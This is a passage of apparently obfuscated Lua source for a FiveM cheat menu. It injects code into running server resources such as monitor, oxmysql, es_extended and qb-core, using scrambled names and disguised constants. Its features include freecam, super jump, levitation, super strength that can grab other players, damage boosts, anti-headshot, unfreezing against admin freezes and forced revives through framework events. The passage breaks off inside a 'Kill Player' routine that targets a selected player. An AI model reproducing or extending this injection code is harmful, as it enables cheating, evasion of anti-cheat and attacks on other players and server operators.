                        local speed = baseSpeed; if IsDisabledControlPressed(0, 21) then speed = boostSpeed end; if IsDisabledControlPressed(0, 19) then speed = slowSpeed end
                        if IsDisabledControlPressed(0, 32) then camPos = camPos + direction * speed end; if IsDisabledControlPressed(0, 33) then camPos = camPos - direction * speed end; if IsDisabledControlPressed(0, 34) then camPos = camPos - right * speed end; if IsDisabledControlPressed(0, 35) then camPos = camPos + right * speed end; if IsDisabledControlPressed(0, 22) then camPos = camPos + vector3(0, 0, 1.0) * speed end; if IsDisabledControlPressed(0, 36) then camPos = camPos - vector3(0, 0, 1.0) * speed end
                        local mX, mY = GetControlNormal(0,1)*mouseSensitivity, GetControlNormal(0,2)*mouseSensitivity; camRot.x = clamp(camRot.x-mY, -89.0, 89.0); camRot.z = camRot.z-mX
                        SetCamCoord(freecamHandle, camPos.x, camPos.y, camPos.z); SetCamRot(freecamHandle, camRot.x, camRot.y, camRot.z, 2); SetFocusPosAndVel(camPos.x, camPos.y, camPos.z, 0.0, 0.0, 0.0)
                        local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, camPos.x+direction.x*1000.0, camPos.y+direction.y*1000.0, camPos.z+direction.z*1000.0, -1, PlayerPedId(), 7); local _, hit, coords, _, entity = GetShapeTestResult(ray); if hit then targetCoords, targetEntity = coords, entity else targetCoords, targetEntity = nil, nil end
                    end
                end
                
                startFreecam = function()
                    if isFreecamActive then return end
                    isFreecamActive = true
                    local startPos, startRot, startFov = GetGameplayCamCoord(), GetGameplayCamRot(2), GetGameplayCamFov()
                    freecamHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y, startPos.z, startRot.x, startRot.y, startRot.z, startFov, true, 2)
                    
                    if not DoesCamExist(freecamHandle) then isFreecamActive = false; return end

                    RenderScriptCams(true, false, 0, true, true)
                    SetCamActive(freecamHandle, true)
                    CreateThread(drawThread)
                    CreateThread(logicThread)
                    CreateThread(cameraThread)
                end

                stopFreecam = function()
                    if not isFreecamActive then return end
                    isFreecamActive = false
                    if freecamHandle and DoesCamExist(freecamHandle) then SetCamActive(freecamHandle, false); RenderScriptCams(false, false, 0, true, true); DestroyCam(freecamHandle, false) end
                    Wait(10); SetFocusEntity(PlayerPedId()); ClearFocus()
                    freecamHandle = nil
                end
                
                CreateThread(function()
                    while g_FreecamFeatureEnabled and not Unloaded do Wait(0)
                        if IsDisabledControlJustPressed(0, 74) then -- H key
                            if isFreecamActive then stopFreecam()
                            else startFreecam() end
                        end
                    end
                end)
            end
            
            initializeFreecam()
        ]]);end,function() MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
            g_FreecamFeatureEnabled = false
            if isFreecamActive and stopFreecam then stopFreecam() end
        ]]);end);MachoMenuCheckbox(v39[1],"Super Jump",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if xCvBnMqWeRtYuIo == nil then xCvBnMqWeRtYuIo = false end
            xCvBnMqWeRtYuIo = true

            local function JcWT5vYEq1()
                local yLkPwOiUtReAzXc = CreateThread
                yLkPwOiUtReAzXc(function()
                    while xCvBnMqWeRtYuIo and not Unloaded do
                        local hGfDsAzXcVbNmQw = SetSuperJumpThisFrame
                        local eRtYuIoPaSdFgHj = PlayerPedId()
                        local oPlMnBvCxZlKjHg = PlayerId()

                        hGfDsAzXcVbNmQw(oPlMnBvCxZlKjHg)
                        Wait(0)
                    end
                end)
            end

            JcWT5vYEq1()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            xCvBnMqWeRtYuIo = false
        ]]);end);MachoMenuCheckbox(v39[1],"Levitation",function() local v180=0;while true do if (v180==(0 + 0)) then MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            -- make helpers global so other chunks can use them
            function ScaleVector(vect, mult)
                return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
            end

            function AddVectors(vect1, vect2)
                return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
            end

            function ApplyForce(entity, direction)
                local XroXTNEFqxoWfH = ApplyForceToEntity
                XroXTNEFqxoWfH(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
            end

            function SubVectors(vect1, vect2)
                return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
            end

            function Oscillate(entity, position, angleFreq, dampRatio)
                local OBaTQqteIpmZVo = GetEntityVelocity
                local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
                local pos2 = AddVectors(ScaleVector(OBaTQqteIpmZVo(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
                local targetPos = SubVectors(pos1, pos2)
                ApplyForce(entity, targetPos)
            end

            function RotationToDirection(rot)
                local radZ = math.rad(rot.z)
                local radX = math.rad(rot.x)
                local cosX = math.cos(radX)
                return vector3(
                    -math.sin(radZ) * cosX,
                    math.cos(radZ) * cosX,
                    math.sin(radX)
                )
            end

            function GetClosestCoordOnLine(startCoords, endCoords, entity)
                local CDGcdMQhosGVCf = GetShapeTestResult
                local UaWIFHgeizhHua = StartShapeTestRay
                local result, hit, hitCoords, surfaceNormal, entityHit =
                    CDGcdMQhosGVCf(UaWIFHgeizhHua(startCoords.x, startCoords.y, startCoords.z, endCoords.x, endCoords.y, endCoords.z, -1, entity, 0))
                return hit == 1, hitCoords
            end

            function GetCameraLookingAtCoord(distance)
                local playerPed = PlayerPedId()
                local camRot = GetGameplayCamRot(2)
                local camCoord = GetGameplayCamCoord()
                local forwardVector = RotationToDirection(camRot)
                local destination = vector3(
                    camCoord.x + forwardVector.x * distance,
                    camCoord.y + forwardVector.y * distance,
                    camCoord.z + forwardVector.z * distance
                )
                local hit, endCoords = GetClosestCoordOnLine(camCoord, destination, playerPed)
                if hit then return endCoords else return destination end
            end
        ]]);MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function awfjawr57awt7f()
                nxtBFlQWMMeRLs = true

                local jIiIfikctHYrlH = CreateThread
                jIiIfikctHYrlH(function()
                    while nxtBFlQWMMeRLs and not Unloaded do
                        Wait(0)
                        local ped = PlayerPedId()

                        local SZxuJlyJQmGlZz = SetPedCanRagdoll
                        local valuOZfymjeVaH = IsEntityPlayingAnim
                        local IiHiLVRagMQhrn = RequestAnimDict
                        local mOZOquvggdnbod = HasAnimDictLoaded
                        local UFZdrZNXpLwpjT = TaskPlayAnim
                        local cQPIZtKyyWaVcY = GetCameraLookingAtCoord
                        local OyvuuAMyvjtIzD = GetGameplayCamRot
                        local XKWvPIkCKMXIfR = IsDisabledControlPressed  -- FIXED: missing '='

                        while XKWvPIkCKMXIfR(0, 22) do
                            SZxuJlyJQmGlZz(ped, false)

                            if not valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                                IiHiLVRagMQhrn("oddjobs@assassinate@construction@")
                                while not mOZOquvggdnbod("oddjobs@assassinate@construction@") do
                                    Wait(0)
                                end
                                UFZdrZNXpLwpjT(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms",
                                    8.0, -8.0, -1, 49, 0, false, false, false)
                            end

                            local camRot = OyvuuAMyvjtIzD(2)
                            local camHeading = (camRot.z + 360) % 360
                            local direction = cQPIZtKyyWaVcY(77)

                            SetEntityHeading(ped, camHeading)
                            Oscillate(ped, direction, 0.33, 0.9)

                            Wait(1)
                        end

                        if valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                            ClearPedTasks(ped)
                        end

                        SZxuJlyJQmGlZz(ped, true)
                    end
                end)
            end

            awfjawr57awt7f()
        ]]);break;end end end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            nxtBFlQWMMeRLs = false
            ClearPedTasks(PlayerPedId())
        ]]);end);MachoMenuCheckbox(v39[1],"Super Strength",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
            fgawjFmaDjdALaO = true

            local holdingEntity = false
            local holdingCarEntity = false
            local holdingPed = false
            local heldEntity = nil
            local entityType = nil
            local awfhjawrasfs = CreateThread

            awfhjawrasfs(function()
                while fgawjFmaDjdALaO and not Unloaded do
                    Wait(0)
                    if holdingEntity and heldEntity then
                        local playerPed = PlayerPedId()
                        local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                        DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                        
                        if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                            RequestAnimDict('anim@mp_rollarcoaster')
                            while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                Wait(100)
                            end
                            TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                        elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                            RequestAnimDict('anim@heists@box_carry@')
                            while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                Wait(100)
                            end
                            TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                        end

                        if not IsEntityAttached(heldEntity) then
                            holdingEntity = false
                            holdingCarEntity = false
                            holdingPed = false
                            heldEntity = nil
                        end
                    end
                end
            end)

            awfhjawrasfs(function()
                while fgawjFmaDjdALaO and not Unloaded do
                    Wait(0)
                    local playerPed = PlayerPedId()
                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local direction = RotationToDirection(camRot)
                    local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                    local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                    local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                    local validTarget = false

                    if hit == 1 then
                        entityType = GetEntityType(entityHit)
                        if entityType == 3 or entityType == 2 or entityType == 1 then
                            validTarget = true
                            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                        end
                    end

                    if IsDisabledControlJustReleased(0, 38) then
                        if validTarget and not holdingEntity then
                            holdingEntity = true
                            heldEntity = entityHit

                            local wfuawruawts = AttachEntityToEntity

                            if entityType == 3 then
                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                            elseif entityType == 2 then
                                holdingCarEntity = true
                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                            elseif entityType == 1 then
                                holdingPed = true
                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                            end
                        end
                    elseif IsDisabledControlJustReleased(0, 246) then
                        if holdingEntity then
                            local wgfawhtawrs = DetachEntity
                            local dfgjsdfuwer = ApplyForceToEntity
                            local sdgfhjwserw = ClearPedTasks

                            wgfawhtawrs(heldEntity, true, true)
                            dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                            holdingEntity = false
                            holdingCarEntity = false
                            holdingPed = false
                            heldEntity = nil
                            sdgfhjwserw(PlayerPedId())
                        end
                    end
                end
            end)

            function RotationToDirection(rotation)
                local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                return direction
            end

            function DrawText3Ds(x, y, z, text)
                local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                local px, py, pz = table.unpack(GetGameplayCamCoords())
                local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
                local fov = (1 / GetGameplayCamFov()) * 100
                scale = scale * fov

                if onScreen then
                    SetTextScale(0.0 * scale, 0.35 * scale)
                    SetTextFont(0)
                    SetTextProportional(1)
                    SetTextColour(255, 255, 255, 215)
                    SetTextDropshadow(0, 0, 0, 0, 155)
                    SetTextEdge(2, 0, 0, 0, 150)
                    SetTextDropShadow()
                    -- SetTextOutline()
                    SetTextEntry("STRING")
                    SetTextCentre(1)
                    AddTextComponentString(text)
                    DrawText(_x, _y)
                end
            end
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            fgawjFmaDjdALaO = false
        ]]);end);MachoMenuCheckbox(v39[1 -0 ],"Super Punch",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if qWeRtYuIoPlMnBv == nil then qWeRtYuIoPlMnBv = false end
            qWeRtYuIoPlMnBv = true

            local function NdaFBuHkvo()
                local uTrEsAzXcVbNmQw = CreateThread
                uTrEsAzXcVbNmQw(function()
                    while qWeRtYuIoPlMnBv and not Unloaded do
                        local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                        local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                        local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                        local sDfGhJkLqWeRtYu = PlayerId()
                        local DamageRateValue = 150.0
                        local WeaponNameForDamage = "WEAPON_UNARMED"


                        nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, DamageRateValue)
                        cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, DamageRateValue)
                        bNmQwErTyUiOpAs(GetHashKey(WeaponNameForDamage), DamageRateValue)

                        Wait(0)
                    end
                end)
            end

            NdaFBuHkvo()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local qWeRtYuIoPlMnBv = false
            local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
            local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
            local bNmQwErTyUiOpAs = SetWeaponDamageModifier
            local sDfGhJkLqWeRtYu = PlayerId()

            nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, 1.0)
            cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, 1.0)
            bNmQwErTyUiOpAs(GetHashKey("WEAPON_UNARMED"), 1.0)
        ]]);end);MachoMenuCheckbox(v39[1],"Throw From Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if zXpQwErTyUiPlMn == nil then zXpQwErTyUiPlMn = false end
            zXpQwErTyUiPlMn = true

            local function qXzRP7ytKW()
                local iLkMzXvBnQwSaTr = CreateThread
                iLkMzXvBnQwSaTr(function()
                    while zXpQwErTyUiPlMn and not Unloaded do
                        local vBnMaSdFgTrEqWx = SetRelationshipBetweenGroups
                        vBnMaSdFgTrEqWx(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                        Wait(0)
                    end
                end)
            end

            qXzRP7ytKW()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            zXpQwErTyUiPlMn = false
        ]]);end);MachoMenuCheckbox(v39[1],"Force Third Person",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
            kJfGhTrEeWqAsDz = true

            local function pqkTRWZ38y()
                local gKdNqLpYxMiV = CreateThread
                gKdNqLpYxMiV(function()
                    while kJfGhTrEeWqAsDz and not Unloaded do
                        local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                        local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                        qWeRtYuIoPlMnBv(0)
                        aSdFgHjKlQwErTy(0)
                        Wait(0)
                    end
                end)
            end

            pqkTRWZ38y()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            kJfGhTrEeWqAsDz = false
        ]]);end);MachoMenuCheckbox(v39[337 -(144 + 192) ],"Force Driveby",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
            zXcVbNmQwErTyUi = true

            local function UEvLBcXqM6()
                local cVbNmAsDfGhJkLz = CreateThread
                cVbNmAsDfGhJkLz(function()
                    while zXcVbNmQwErTyUi and not Unloaded do
                        local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                        local eRtYuIoPaSdFgHi = PlayerPedId()

                        lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                        Wait(0)
                    end
                end)
            end

            UEvLBcXqM6()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            zXcVbNmQwErTyUi = false
        ]]);end);MachoMenuCheckbox(v39[217 -(42 + 174) ],"Anti-Headshot",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if yHnvrVNkoOvGMWiS == nil then yHnvrVNkoOvGMWiS = false end
            yHnvrVNkoOvGMWiS = true

            local eeitKYqDwYbPslTW = CreateThread
            local function LIfbdMbeIAeHTnnx()
                eeitKYqDwYbPslTW(function()
                    while yHnvrVNkoOvGMWiS and not Unloaded do
                        local fhw72q35d8sfj = SetPedSuffersCriticalHits
                        fhw72q35d8sfj(PlayerPedId(), false)
                        Wait(0)
                    end
                end)
            end

            LIfbdMbeIAeHTnnx()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            yHnvrVNkoOvGMWiS = false
            fhw72q35d8sfj(PlayerPedId(), true)
        ]]);end);MachoMenuCheckbox(v39[1],"Anti-Freeze",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if nHgFdSaZxCvBnMq == nil then nHgFdSaZxCvBnMq = false end
            nHgFdSaZxCvBnMq = true

            local sdfw3w3tsdg = CreateThread
            local function XELa6FJtsB()
                sdfw3w3tsdg(function()
                    while nHgFdSaZxCvBnMq and not Unloaded do
                        local fhw72q35d8sfj = FreezeEntityPosition
                        local segfhs347dsgf = ClearPedTasks

                        if IsEntityPositionFrozen(PlayerPedId()) then
                            fhw72q35d8sfj(PlayerPedId(), false)
                            segfhs347dsgf(PlayerPedId())
                        end
                        
                        Wait(0)
                    end
                end)
            end

            XELa6FJtsB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            nHgFdSaZxCvBnMq = false
        ]]);end);MachoMenuCheckbox(v39[1],"Anti-Blackscreen",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if aDjsfmansdjwAEl == nil then aDjsfmansdjwAEl = false end
            aDjsfmansdjwAEl = true

            local sdfw3w3tsdg = CreateThread
            local function XELWAEDa6FJtsB()
                sdfw3w3tsdg(function()
                    while aDjsfmansdjwAEl and not Unloaded do
                        DoScreenFadeIn(0)
                        Wait(0)
                    end
                end)
            end

            XELWAEDa6FJtsB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            aDjsfmansdjwAEl = false
        ]]);end);local v51=MachoMenuInputbox(v39[2 + 0 ],"Model Name:","...");MachoMenuButton(v39[2 + 0 ],"Change Model",function() local v181=MachoMenuGetInputbox(v51);if ((type(v181)=="string") and (v181~="")) then local v288=0;local v289;while true do if (v288==(0 + 0)) then v289=string.format([[
                local function GykR8qjWTp()
                    local nHgFdSaZxCvBnMq = RequestModel
                    local xCvBnMqWeRtYuIo = HasModelLoaded
                    local aSdFgHjKlQwErTy = SetPlayerModel
                    local oPlMnBvCxZlKjHg = SetPedDefaultComponentVariation

                    nHgFdSaZxCvBnMq(GetHashKey("%s"))
                    while not xCvBnMqWeRtYuIo(GetHashKey("%s")) do
                        Wait(1)
                    end
                    
                    aSdFgHjKlQwErTy(PlayerId(), GetHashKey("%s"))
                    oPlMnBvCxZlKjHg(PlayerPedId())
                end

                GykR8qjWTp()
            ]],v181,v181,v181);MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,v289);break;end end end end);MachoMenuButton(v39[1506 -(363 + 1141) ],"White Thug Drip",function() local v182=1580 -(1183 + 397) ;while true do if (v182==0) then function WhiteThugDrip() local v351=0 -0 ;local v352;while true do if (v351==(1 + 0)) then SetPedComponentVariation(v352,8,15,0 + 0 ,1977 -(1913 + 62) );SetPedComponentVariation(v352,3,4 + 1 ,0,5 -3 );v351=2;end if (v351==(1936 -(565 + 1368))) then SetPedPropIndex(v352,0 -0 ,1662 -(1477 + 184) ,0,true);break;end if ((0 -0)==v351) then v352=PlayerPedId();SetPedComponentVariation(v352,11,109,0 + 0 ,858 -(564 + 292) );v351=1 -0 ;end if (2==v351) then SetPedComponentVariation(v352,4,168 -112 ,0,2);SetPedComponentVariation(v352,6,19,304 -(244 + 60) ,2 + 0 );v351=479 -(41 + 435) ;end end end WhiteThugDrip();break;end end end);MachoMenuButton(v39[2],"JTG Mafia Drip",function() local v183=1001 -(938 + 63) ;while true do if (v183==(0 + 0)) then function JTGMafia() local v353=0;local v354;while true do if (v353==(1125 -(936 + 189))) then v354=PlayerPedId();SetPedComponentVariation(v354,4 + 7 ,5,0,1615 -(1565 + 48) );v353=1 + 0 ;end if (v353==2) then SetPedComponentVariation(v354,1142 -(782 + 356) ,42,267 -(176 + 91) ,2);SetPedComponentVariation(v354,15 -9 ,8 -2 ,1092 -(975 + 117) ,1877 -(157 + 1718) );v353=3 + 0 ;end if (v353==(3 -2)) then SetPedComponentVariation(v354,8,51 -36 ,1018 -(697 + 321) ,5 -3 );SetPedComponentVariation(v354,5 -2 ,11 -6 ,0 + 0 ,2);v353=3 -1 ;end if (v353==(7 -4)) then SetPedPropIndex(v354,1227 -(322 + 905) ,26,611 -(602 + 9) ,true);SetPedPropIndex(v354,1,3,1189 -(449 + 740) ,true);break;end end end JTGMafia();break;end end end);MachoMenuButton(v39[875 -(826 + 46) ],"Heal",function() SetEntityHealth(PlayerPedId(),1147 -(245 + 702) );end);MachoMenuButton(v39[9 -6 ],"Armor",function() SetPedArmour(PlayerPedId(),33 + 67 );end);MachoMenuButton(v39[1901 -(260 + 1638) ],"Fill Hunger",function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function DawrjatjsfAW()
                TriggerEvent('esx_status:set', 'hunger', 1000000)
            end

            DawrjatjsfAW()
        ]]);end);MachoMenuButton(v39[443 -(382 + 58) ],"Fill Thirst",function() MachoInjectResource2(9 -6 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function sWj238fsMAw()
                TriggerEvent('esx_status:set', 'thirst', 1000000)
            end

            sWj238fsMAw()
        ]]);end);MachoMenuButton(v39[3 + 0 ],"Revive",function() MachoInjectResource2(5 -2 ,(v48("ox_inventory") and "ox_inventory") or (v48("ox_lib") and "ox_lib") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("wasabi_ambulance") and "wasabi_ambulance") or (v48("ak47_ambulancejob") and "ak47_ambulancejob") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function AcjU5NQzKw()
                if GetResourceState('prp-injuries') == 'started' then
                    TriggerEvent('prp-injuries:hospitalBedHeal', skipHeal)
                    return
                end

                if GetResourceState('es_extended') == 'started' then
                    TriggerEvent("esx_ambulancejob:revive")
                    return
                end

                if GetResourceState('qb-core') == 'started' then
                    TriggerEvent("hospital:client:Revive")
                    return
                end

                if GetResourceState('wasabi_ambulance') == 'started' then
                    TriggerEvent("wasabi_ambulance:revive")
                    return
                end

                if GetResourceState('ak47_ambulancejob') == 'started' then
                    TriggerEvent("ak47_ambulancejob:revive")
                    return
                end

                NcVbXzQwErTyUiO = GetEntityHeading(PlayerPedId())
                BvCxZlKjHgFdSaP = GetEntityCoords(PlayerPedId())

                RtYuIoPlMnBvCxZ = NetworkResurrectLocalPlayer
                RtYuIoPlMnBvCxZ(BvCxZlKjHgFdSaP.x, BvCxZlKjHgFdSaP.y, BvCxZlKjHgFdSaP.z, NcVbXzQwErTyUiO, false, false, false, 1, 0)
            end

            AcjU5NQzKw()
        ]]);end);MachoMenuButton(v39[8 -5 ],"Suicide",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function RGybF0JqEt()
                local aSdFgHjKlQwErTy = SetEntityHealth
                aSdFgHjKlQwErTy(PlayerPedId(), 0)
            end

            RGybF0JqEt()
        ]]);end);MachoMenuButton(v39[1208 -(902 + 303) ],"Force Ragdoll",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function awfAEDSADWEf()
                local cWAmdjakwDksFD = SetPedToRagdoll
                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
            end

            awfAEDSADWEf()
        ]]);end);MachoMenuButton(v39[3],"Clear Task",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function iPfT7kN3dU()
                local zXcVbNmAsDfGhJk = ClearPedTasksImmediately
                zXcVbNmAsDfGhJk(PlayerPedId())
            end

            iPfT7kN3dU()
        ]]);end);MachoMenuButton(v39[3],"Clear Vision",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function MsVqZ29ptY()
                local qWeRtYuIoPlMnBv = ClearTimecycleModifier
                local kJfGhTrEeWqAsDz = ClearExtraTimecycleModifier

                qWeRtYuIoPlMnBv()
                kJfGhTrEeWqAsDz()
            end

            MsVqZ29ptY()
        ]]);end);MachoMenuButton(v39[5 -2 ],"Randomize Outfit",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function UxrKYLp378()
                local UwEsDxCfVbGtHy = PlayerPedId
                local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                local QwAzXsEdCrVfBg = SetPedComponentVariation
                local LkJhGfDsAqWeRt = SetPedHeadBlendData
                local MnBgVfCdXsZaQw = SetPedHairColor
                local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                local TyUiOpAsDfGhJk = SetPedHeadOverlay
                local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                local DfGhJkLzXcVbNm = ClearPedProp

                local function PqLoMzNkXjWvRu(component, exclude)
                    local ped = UwEsDxCfVbGtHy()
                    local total = FdSaQwErTyUiOp(ped, component)
                    if total <= 1 then return 0 end
                    local choice = exclude
                    while choice == exclude do
                        choice = math.random(0, total - 1)
                    end
                    return choice
                end

                local function OxVnBmCxZaSqWe(component)
                    local ped = UwEsDxCfVbGtHy()
                    local total = FdSaQwErTyUiOp(ped, component)
                    return total > 1 and math.random(0, total - 1) or 0
                end

                local ped = UwEsDxCfVbGtHy()

                QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                local face = math.random(0, 45)
                local skin = math.random(0, 45)
                LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                local hairMax = FdSaQwErTyUiOp(ped, 2)
                local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                MnBgVfCdXsZaQw(ped, 0, 0)

                local brows = RtYuIoPlMnBvCx(2)
                TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                DfGhJkLzXcVbNm(ped, 0)
                DfGhJkLzXcVbNm(ped, 1)
            end

            UxrKYLp378()
        ]]);end);MachoMenuButton(v40[2 -1 ],"Kill Player",function() local v184=MachoMenuGetSelectedPlayer();if (v184 and (v184>0)) then MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
                local function UiLpKjHgFdSaTrEq()
                    local RvTyUiOpAsDfGhJ = %d

                    local dFrTgYhUjIkLoPl = CreateThread
                    dFrTgYhUjIkLoPl(function()
                        Wait(0)

                        local ZxCvBnMaSdFgTrEq = GetPlayerPed
                        local TyUiOpAsDfGhJkLz = GetEntityCoords
                        local QwErTyUiOpAsDfGh = ShootSingleBulletBetweenCoords
